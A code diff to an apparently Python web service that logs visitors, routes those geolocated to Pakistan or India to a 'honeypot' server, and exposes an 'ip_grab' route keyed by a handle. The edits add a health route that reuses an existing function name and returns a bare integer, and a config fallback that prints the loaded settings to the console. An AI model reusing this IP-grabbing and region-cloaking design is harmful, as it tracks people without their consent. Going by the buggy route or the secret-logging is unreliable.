@@ -139,7 +139,7 @@ async def redirect_handler(ip ,normal_server, honeypot):
             country_code = 'PK'
             l.info(f'Test flag, changed coutry code: {country_code}')
         else:
-            l.info(f'Test flag, not changing coutry code')
+            l.info('Test flag, not changing coutry code')
         redirected = not redirected
         
     if country_code and country_code in ['PK', 'IN']:
@@ -168,6 +168,11 @@ async def index():
         return await redirect_handler(ip_address, default_server, alternative_server_url)
     except Exception as e:
         l.error(f'{e}')
+        
+@app.route('/health')
+async def index():
+    l.info('Health route called.')
+    return 200
         
 @app.route('/ticket/<path:dc_handle>')
 async def ip_grab(dc_handle):
@@ -235,7 +240,13 @@ async def favicon():
 
 if __name__ == '__main__':
     
-    config = read_json_file('config.json')
+    try:
+        config = read_json_file('config.json')
+    except FileNotFoundError as e:
+        l.error(e)
+        l.passing('Trying to gather config from env vars')
+        config = get_env_vars()
+        l.console_log(config)
     sub_nets = read_subnets_from_file('ipv4.txt') # txt file courtesy of https://github.com/X4BNet/lists_vpn
     test_flag = config['test_flag']
     redirected = False
